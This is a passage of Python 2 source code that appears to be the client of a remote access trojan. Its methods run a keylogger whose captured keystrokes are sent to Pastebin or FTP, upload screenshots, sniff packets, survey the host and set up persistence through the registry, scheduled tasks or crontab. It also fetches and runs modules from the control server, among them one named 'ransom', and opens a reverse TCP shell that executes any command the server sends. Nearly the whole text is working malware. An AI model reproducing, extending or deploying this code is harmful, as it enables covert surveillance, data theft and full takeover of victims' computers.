    @config(platforms=['win32'], buffer=cStringIO.StringIO(), max_bytes=1024, command=True, usage='process <mode>s')
    def process(self, args=None):
        """
        process utilities - mode: block, list, monitor, kill, search
        """
        try:
            if 'process' not in globals():
                return "Error: missing module 'process'"
            elif not args:
                return self.ps.usage
            else:
                cmd, _, action = str(args).partition(' ')
                if hasattr(process, cmd):
                    return getattr(process, cmd)(action) if action else getattr(process, cmd)()
                else:
                    return "usage: {}\n\tmode: block, list, search, kill, monitor\n\t".format(self.ps.usage)
        except Exception as e:
            util.debug("{} error: {}".format(self.process.func_name, str(e)))
            

    @config(platforms=['win32','linux2','darwin'], command=True, usage='portscan <target>')
    def portscan(self, args):
        """
        portscan the network to find online hosts and open ports
        """
        if 'portscan' not in globals():
            return "Error: missing module 'portscan'"
        try:
            mode, _, target = str(args).partition(' ')
            if target:
                if not util.ipv4(target):
                    return "Error: invalid IP address '%s'" % target
            else:
                target = socket.gethostbyname(socket.gethostname())
            if hasattr(portscan, mode):
                return getattr(portscan, mode)(target)
            else:
                return "Error: invalid mode '%s'" % mode
        except Exception as e:
            util.debug("{} error: {}".format(self.portscan.func_name, str(e)))
            

    def pastebin(self, source):
        """
        Dump file/data to Pastebin (requires: Pastebin api key)
        """
        try:
            api_dev_key  = None
            api_user_key = None
            info = {'api_option': 'paste', 'api_paste_code': util.normalize(source)}
            keys = self.api.get('paste')
            if len(keys):
                info.update({'api_dev_key': keys[0]})
            if len(keys) > 1:
                info.update({'api_user_key': keys[1]})
            paste = util.post('https://pastebin.com/api/api_post.php',data=info)        
            return '{}/raw/{}'.format(os.path.split(paste)[0], os.path.split(paste)[1]) if paste.startswith('http') else paste
        except Exception as e:
            return '{} error: {}'.format(self.pastebin.func_name, str(e))


    @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger start/stop/dump/status')
    def keylogger(self, mode=None):
        """
        log user keystrokes - mode; auto, run, stop, dump, status
        """
        def status():
            mode    = 'stopped'
            if globals().get('_threads'):
                if 'keylogger' in globals().get('_threads'):
                    mode = 'running'
            update  = util.status(float(globals().get('_threads').get('keylogger').name))
            length  = keylogger._buffer.tell()
            return "Status\n\tname: {}\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(func_name, mode, update, length)

        if 'keylogger' not in globals():
            return "Error: missing module 'keylogger'"
                                     
        elif not mode:
            if 'keylogger' not in _threads:
                return keylogger.usage
            else:
                return status()
                                     
        else:
            if 'run' in mode or 'start' in mode:
                if 'keylogger' not in _threads:
                    _threads['keylogger'] = keylogger.run()
                    return status()
                else:
                    return status()
                                     
            elif 'stop' in mode:
                try:
                    self.stop('keylogger')
                except:
                    pass
                try:
                    self.stop('keylogger')
                except:
                        pass
                return status()

            elif 'auto' in mode:
                _threads['keylogger'] = keylogger.auto()
                return status()

            elif 'dump' in mode:
                result = pastebin(keylogger._buffer) if not 'ftp' in mode else ftp(keylogger._buffer)
                keylogger.buffer.reset()
                return result

            elif 'status' in mode:
                return status()
                                     
            else:
                return keylogger.usage + '\n\targs: start, stop, dump'

            
    @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot <mode>')
    def screenshot(mode=None):
        """
        capture a screenshot from host device - upload modes: ftp, imgur
        """
        try:
            if 'screenshot' not in globals():
                return "Error: missing module 'screenshot'"
            elif not mode in ('ftp','imgur'):
                return "Error: invalid mode '%s'" % str(mode)
            else:
                return screenshot.screenshot(mode)
        except Exception as e:
            util.debug("{} error: {}".format(self.screenshot.func_name, str(e)))


    def info(self):
        """
        Do system survey and return information about host machine
        """
        data = {}
        for function in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
            if hasattr(util, function):
                try:
                    data[function] = getattr(util, function)()
                except Exception as e:
                    util.debug("{} error: {}".format(self.info.func_name, str(e)))
        return data


    @config(platforms=['win32','linux2','darwin'], command=True, usage='persistence add/remove [method]')
    def persistence(self, args=None):
        """
        establish persistence - methods: registry_key, scheduled_task, launch_agent, crontab_job, startup_file, hidden_file
        """
        try:
            if not 'persistence' in globals():
                return "Error: missing module 'persistence'"
            elif not args:
                return self.persistence.usage
            else:
                cmd, _, action = str(args).partition(' ')
                methods = [m for m in persistence.methods if sys.platform in persistence.methods[m]['platforms']]
                if cmd not in ('add','remove'):
                    return self.persistence.usage + str('\nmethods: %s' % ', '.join([str(m) for m in persistence.methods if sys.platform in getattr(shell, '_persistence_add_%s' % m).platforms]))
                for method in methods:
                    if method == 'all' or action == method:
                        persistence.methods[method]['established'], persistence.methods[method]['result'] = getattr(self, '_'.join(cmd, method))()
                return json.dumps({m: persistence.methods[m]['result'] for m in methods})
        except Exception as e:
            util.debug("{} error: {}".format(self.persistence.func_name, str(e)))
        return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in persistence.methods if sys.platform in getattr(shell, '_persistence_add_%s' % m).platforms]))


    @config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer mode=[str] time=[int]')
    def packetsniffer(self, args):
        """
        capture traffic on local network
        """
        try:
            if 'packetsniffer' not in globals():
                return "Error: missing module 'packetsniffer'"
            else:
                mode   = None
                length = None
                cmd, _, action = str(args).partition(' ')
                for arg in action.split():
                    if arg.isdigit():
                        length = int(arg)
                    elif arg in ('ftp','pastebin'):
                        mode   = arg
                _threads[self.packetsniffer.func_name] = packetsniffer(mode, seconds=length)
                return 'Capturing network traffic for {} seconds'.format(duration)
        except Exception as e:
            util.debug("{} error: {}".format(self.packetsniffer.func_name, str(e)))


    def task_handler(self, task=None):
        """
        Reports task results to server
        """
        if task:
            if isinstance(task, str):
                try:
                    task = json.loads(task)
                except: pass
            if isinstance(task, dict):
                try:
                    host = self.api.get('host')
                    port = int(self.api.get('port')) + 1
                    if self.info.get('public_ip') and self.info.get('mac_address'):
                        uid = hashlib.new('md5', ''.join(map(self.info.get, ('public_ip', 'mac_address')))).hexdigest()
                    else:
                        uid = hashlib.new('md5', ''.join(util.public_ip(), util.mac_address())).hexdigest()
                    log = logging.makeLogRecord({'name': uid, 'msg': task})
                    logger  = logging.getLogger(uid)
                    handler = logging.handlers.SocketHandler(host, port)
                    logger.handlers = [handler]
                    logger.setLevel(logging.DEBUG)
                    logger.info(log)
                except Exception as e:
                    util.debug(e)
            else:
                util.debug("Error: invalid task type - expected '{}', received '{}'".format(dict, type(task)))
        else:
            util.debug("Error: missing required argument 'task'")


    def package_handler(self, packages=['numpy','Crypto', 'Crypto.Util', 'Crypto.Cipher.AES', 'Crypto.Hash.SHA256']):
        """
        directly import packages remotely
        """
        imports = {}
        host     = self.api.get('host')
        port     = int(self.api.get('port')) + 2
        base_url = 'http://{}:{}'.format(host, port)
        with httpimport.remote_repo(packages, base_url):
            for package in packages:
                try:
                    exec "import %s" % package in globals()
                    imports[package] = globals().get(package)
                except ImportError:
                    pass
        return imports
    

    def module_handler(self, modules=['ransom', 'webcam', 'outlook', 'screenshot', 'portscan', 'escalate', 'keylogger', 'phone', 'packetsniffer', 'process', 'payload', 'persistence']):
        """
        directly import modules remotely 
        """
        imports  = {}
        host     = self.api.get('host')
        port     = int(self.api.get('port')) + 3
        base_url = 'http://{}:{}'.format(host, port)
        with httpimport.remote_repo(modules, base_url):
            for module in modules:
                try:
                    exec "import %s" % module in globals()
                    imports[module] = globals().get(module)
                except ImportError:
                    pass
        return imports


    @threaded
    def reverse_tcp_shell(self):
        """
        send encrypted shell back to server via outgoing TCP connection
        """
        try:
            _threads['prompt'] = self._prompt_handler()
            while True:
                if self._flags['connection'].wait(timeout=1.0):
                    if not self._flags['prompt'].is_set():
                        task = self.recv()
                        if isinstance(task, dict):
                            cmd, _, action = [i.encode() for i in task['command'].partition(' ')]
                            try:
                                result  = bytes(getattr(self, cmd)(action) if action else getattr(self, cmd)()) if cmd in sorted([attr for attr in vars(shell) if not attr.startswith('_')]) else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                            except Exception as e:
                                result  = "{} error: {}".format(self.reverse_tcp_shell.func_name, str(e))
                            task.update({'result': result})
                            self.send(**task)
                        self._flags['prompt'].set()
                else:
                    util.debug("Connection timed out")
                    break
        except Exception as e:
            util.debug("{} error: {}".format(self.reverse_tcp_shell.func_name, str(e)))


